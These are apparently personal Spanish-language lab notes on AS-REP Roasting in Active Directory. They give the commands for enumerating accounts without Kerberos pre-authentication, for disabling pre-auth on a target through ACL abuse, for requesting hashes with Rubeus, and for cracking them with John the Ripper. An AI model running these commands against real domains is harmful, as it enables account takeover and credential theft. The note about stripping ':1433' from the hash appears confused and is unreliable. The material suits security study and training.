# ASREPRoasting 

Tags: #AD #ASREPRoasting 

## Enumeración - ASREPs

```powershell 
! Usuario: Usuario de dominio

❯ Get-DomainUser -PreauthNotRequired -Verbose
# Enumerar cuentas con Kerberos Pre-Authentication deshabilitado usando PowerView — candidatas para AS-REP Roasting.

❯ Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
# Igual que el anterior pero usando el módulo ActiveDirectory nativo.
```

## Forzar la deshabilitación Kerberos Preauth

```powershell 
! Usuario: Usuario de dominio

❯ Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
# Enumerar ACLs interesantes del dominio filtrando por el grupo RDPUsers — identifica sobre qué objetos tiene permisos el grupo para abusar de ellos.

! Usuario: Usuario de dominio con permisos sobre el objeto objetivo (ej. miembro de RDPUsers)
❯ Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
# Deshabilitar Kerberos Pre-Authentication en una cuenta objetivo abusando de permisos sobre el objeto — la deja vulnerable a AS-REP Roasting.

❯ Get-DomainUser -PreauthNotRequired -Verbose
# Verificar que la cuenta objetivo ahora tiene Pre-Authentication deshabilitado y es Kerberoasteable vía AS-REP.
```

## Solicitar el AS-REP con Rubeus

```powershell 
! Usuario: Usuario de dominio

❯ .\Loader.exe -path C:\AD\Rubeus.exe -args asreproast  
# Solicitar el AS-REP cifrado de todas las cuentas disponibles (No recomendable)

❯ .\Rubeus.exe asreproast /user:VPN1user /outfile:C:\AD\Tools\asrephashes.txt 
# Solicitar el AS-REP cifrado de una cuenta con Pre-Authentication deshabilitado y guardar el hash en un archivo para crackear offline. Esta es la forma mas óptima de hacerlo 
```

## Cracking 

```powershell 
! Usuario: Usuario local (atacante)

❯ .\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt asrephashes.txt
# Crackear los hashes offline usando John the Ripper con un wordlist — recupera la contraseña en texto claro de la cuenta de servicio.

Nota:
	- El hash que se obtiene se debe de modificar y quitar la parte de ':1433'
```

```bash 
# Utilizar las siguientes herramientas para generar diccionarios customizados
- Crunch 
- CeWL
- Bopscrk
```

![](Pasted%20image%2020260420164641.png)